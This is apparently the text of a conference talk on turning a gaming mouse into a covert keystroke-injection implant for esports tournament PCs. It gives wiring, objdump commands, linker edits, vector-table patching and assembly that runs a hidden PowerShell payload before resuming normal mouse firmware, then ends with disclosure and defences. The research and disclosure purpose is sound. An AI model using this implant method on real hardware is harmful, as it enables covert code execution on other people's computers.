If You Give A Mouse A Microchip
It will execute a payload
and cheat at your high-stakes video game tournament
Mark Williams (skud) and Rob Stanley (Sky)
●
1958 - ‘first’ video game 
●
1972 - first recorded, sponsored video game tournament 
○
Spacewar! - build in 1960s
○
Rolling Stone sponsored a Spacewar! Olympics in ‘72
Competitive Gaming
Esports
The International 2016
●
Teams from all over the world
●
20 million dollar prize pool (19 million crowd funded)
●
17,000 people watching at the venue
●
Over 20 million people watching online
Esports
●
Massive temporary networks
●
Hot-seat computers
●
Internet connectivity
●
Support player-owned peripherals
Security Challenges at Esports Events
Computers at events typically close these attack vectors:
●
Internet access restricted
●
Player accounts don’t have admin
●
Drivers / configs pre-installed
●
USB Mass Storage disabled
●
Extra USB ports disabled
But you can plug your own mouse and keyboard into the PC!
Potential Attack Vector
●
Found a mouse with an ‘overpowered’ microcontroller
●
Not enough scrutiny over devices at esports tournaments
Why Hack with a Mouse?
Gaming Mouse
Gaming Mouse
●
STMicro STM32F103CB Microcontroller
○
ARM Cortex  M3microprocessor
○
Supports ST-Link programming interface 
●
128KB Flash Memory
○
Stores user profiles onboard - save your dpi settings!
●
Lots of buttons
●
RGB LEDs
●
LCD screen
○
User customizable bitmaps
1.
Connect to microcontroller built into the mouse.
2.
Insert code to act as USB Keyboard.
3.
Send keystrokes to execute payload on target computer
4.
“Unplug” the keyboard app, run original mouse code
5.
???
6.
Profit Responsible disclosure 
Without obvious physical modifications to the mouse
Hijack the Microcontroller
Frequently Asked Question:
“Wait, isn’t that just a Rubber Ducky in a mouse?”
Hang on a second
???
STMicro STM32F4 Discovery Development board
●
Has an onboard ARM Cortex M4 for initial dev
●
Has an external programming interface to program mouse
Mouse with a ARM cortex processor
Soldering Iron
Wires
Hardware Tools Used
●
STM32 ST-Link Utility
●
System Workbench for STM32
●
STM32CubeMX
●
objdump (for ARM)
* not affiliated with stmicro
Software Tools (all free!)
There’s the microcontroller!
We need to talk to it somehow...
Open it up!
Find documentation
We need to connect to the chip to program it
Don’t have access to the chip via USB
RTFM!
ST-Link interface uses pins 
●
PA13 (JTCK / SWCLK / PA14) 
●
PA14 (JTMS / SWDIO / PA13)
●
GND
Don’t be dumb
Bricked
I tried to solder directly to the processor’s pins...
With an aging soldering iron
Then I flipped the board over and found these 
convenient solder pads for GND, TCK, and 
TMS. The exact pins I need to flash the 
processor!
Don’t be dumb
Much better!
STM32 Discovery ST-Link interface
Remove CN2 jumpers to disconnect ST-Link 
from the Discovery Board’s onboard 
processor
ST-Link      →  Target
SWD pin 2 →  TCK
SWD pin 3 →  GND
SWD pin 4 →  TMS
STM32F4 Discovery schematic
Discovery Board
ST-Link connection jumper
We’re connected!
CN2 Jumpers disconnected for external programming 
Hold boot0 pin high during power-on to enter 
programmable mode
From our pin diagram, we know boot0 is pin 5
Very carefully apply 3 volts to boot0 pin and 
plug the mouse in
Back to the documentation! 
Boot0
RST
ST-Link is connected!
If we want the mouse to keep 
working, we should save what 
is currently on it
Connected to microcontroller via ST-Link.
TODO:
1.
Extract original mouse binary
2.
Build application that registers as a keyboard
3.
Find empty space in mouse’s binary and insert our application
We’re in!
When connected:
1.
Open notepad
2.
Automatically type an encoded powershell script
a.
Decompresses self
b.
Forks and executes in background
c.
Deletes itself after forking
3.
Save to %temp%/hack.bat
4.
Close notepad
5.
Run %temp%/hack.bat
Build payload to insert into mouse binary
Objdump binary extracted from mouse
Flash memory starts at 0x08000000, dump the binary relative to this address:
objdump -b binary -marm --adjust-vma=0x08000000 -D -C -Mforce-thumb sensei.bin > sensei.txt
 80109ae:    2000 
 movs    r0, #0
 80109b0:    171c 
 asrs    r4, r3, #28
 80109b2:    0000 
 movs    r0, r0
 80109b4:    e394 
 b.n     0x80110e0
 80109b6:    0800 
 lsrs    r0, r0, #32
    ...
 8016800:    5300 
 strh    r0, [r0, r4]
 8016802:    756b 
 strb    r3, [r5, #21]
 8016804:    2064 
 movs    r0, #100    ; 0x64
Looks like we have plenty of space from 0x080109b6 to 0x08016800
We’ll put our application at 0x08010a00 (so it is on a 2k boundary)
Where do we put our code?
The default linker for the STMicro projects links to memory location 0x08000000
But our app is being placed at location 0x08010a00
Need to edit 2 files to appropriately link to this non-default location
STM32F103CBTx_FLASH.ld
system_stm32f1xx.c
Run Application at Custom Location
/* Highest address of the user mode stack */
_estack = 0x20005000; 
/*    was 0x20000a70 in sensei.bin - our code wants more stack */
/* Specify the memory areas */
MEMORY
{
RAM (xrw)  
: ORIGIN = 0x20000000, LENGTH = 14K   
FLASH (rx)  : ORIGIN = 0x08010a00, LENGTH = 14K  
}
STM32F103CBTx_FLASH.ld 
/*!:
 8000000:    20000a70
 8000004:    08000141    
 8000008:    0800157f    
 800000c:    08000d65     
 8000010:    0800157d      
 8000014:    0800024d     
 8000018:    08002c7f 
Documentation states that bit[0] of an address 
must be 1 or the branch command will fault
A 1 in bit[0] tells the processor to execute in 
thumb mode
Need to know where the entry point of our code is. 
objdump -b binary -marm --adjust-vma=0x08010a00 -D -C -Mforce-thumb injection.bin > injection.txt
Disassembly of section .data:
08010a00 :
 8010a00:    5000 
 str    r0, [r0, r0]
 8010a02:    2000 
 movs    r0, #0
 8010a04:    3625 
 ;  instruction: 0xb6d1
 8010a06:    0801 
 lsrs    r1, r0, #32
Our app’s entry point is at 0x08013625
Get mouse to run our app
Update the values at 0x00 and 0x04 in the mouse’s binary file
Patch That Table!
Old Vector Table
New Vector Table
Using your hex editor of choice:
Navigate to offset 0x00010a00
Paste the entire hex dump from the hack.bin file into the mouse_hack.bin file at 
this offset
Insert That Code!
Inject!
The mouse should now run our injected application
But it won’t do anything else
Now we need to make it return to the original functionality
Hooray! 
Write a bunch of assembly and 
store it at the end of the main() 
function
This code will be executed out of 
order via branch instructions
Sneaky Assembly Usage
Program Flow
Mouse
Hack main()
Hack end 
Hack entry
Mouse entry
Vector table
1
2
3
4
5
// ENTRY POINT OF PROGRAM
asm("mrs r0, PSP");   
 // store program stack pointer in r0
asm("push {r0-r9}");  
 // push all registers that may have been
                               // initialized by mouse's bootloader
asm("ldr r0, HACK_ENTRY");     // load r0 with entry point of our inserted
                               // application
asm("bx r0");   
 // branch to the hack
New Entry Point
asm("ldr r0, STACK_PTR"); 
// load saved stack pointer into r0
asm("msr MSP, r0");       
// set stack pointer with value in r0
asm("pop {r0-r9}");       
// restore registers we pushed onto stack
asm("msr PSP, r0");       
// set the program stack pointer
asm("ldr r0, STACK_SIZE");    // load desired stack size into r0
asm("msr MSP, r0");       
// set stack pointer with value in r0
asm("ldr lr, ALL_F");     
// set link register to default value 0xffffffff
asm("ldr r0, MOUSE_ENTRY");   // load r0 with address of mouse entry point
asm("bx r0");
// Branch to original mouse code
// ENDS OUR PROGRAM
Jump To Mouse Code
// DATA
asm("MOUSE_ENTRY:    .word 0x08000141"); // entry point of original mouse code
asm("HACK_ENTRY:     .word 0x08013625"); // entry point of this code
asm("STACK_PTR:      .word 0x20004fd8"); // the stack pointer address AFTER
                                         //   pushing registers to stack
asm("STACK_SIZE:     .word 0x20005000"); // stack pointer location for entry
                                         //   into mouse code
asm("ALL_F:         .word 0xffffffff"); // default value of link register 
asm("FEEDBEEF:      .word 0xfeedbeef"); // breadcrumbs
Storing Data in Assembly
Found The Beef!
Inserted code can have unintended side effects.
Almost there!
●
Mouse code shipped with debugging disabled (hooray!)
●
Debugging requires interrupts
●
My code can debug...
Debug with no Debug
●
CPS IE - enable interrupts
●
CPS ID - disable interrupts
●
Flags:
○
i - PRIMASK (configurable handlers)
○
f - FAULTMASK (all handlers)
ARM Interrupts: Change Processor State
●
Find CPSID in objdump output
○
0xB672
●
Replace with no-op 
○
0x0000
●
Cross fingers!
Hands off my PRIMASK!
 800018c:    f380 8808    msr    
MSP, r0
 8000190:    4770 
 bx    
lr
 8000192:    b662 
 cpsie    i
 8000194:    4770 
 bx    
lr
 8000196:    b672 
 cpsid    i
 8000198:    4770 
 bx    
lr
Demonstration
●
Have application check reset vector at boot
○
App can re-write reset vector after booting
●
Application has hash of entire flash
○
Can’t store user modifications then?
○
What if the injected code changes the hash value?
○
What if injected code clears the flash it resides in after executing?
Can we defend against extra code in a device?
●
Only allow ‘normal’ behavior from HID peripherals
●
Sign and verify drivers and flash of every peripheral (probably not)
●
Whitelist EXEs
●
Force everyone to use USB → PS2 adapters (nope)
●
Provide trusted hardware
Can we defend against this payload style?
●
Source Code & Examples - https://bitbucket.org/mdhomebrew/
●
ARM Application Notes - http://infocenter.arm.com/help/index.jsp
●
ST-Link - http://www.st.com/en/embedded-software/stsw-link004.html
●
OpenSTM IDE - http://www.openstm32.org/
●
STM32CubeMX - http://www.st.com/en/development-tools/stm32cubemx.html
References and helpful links
Questions?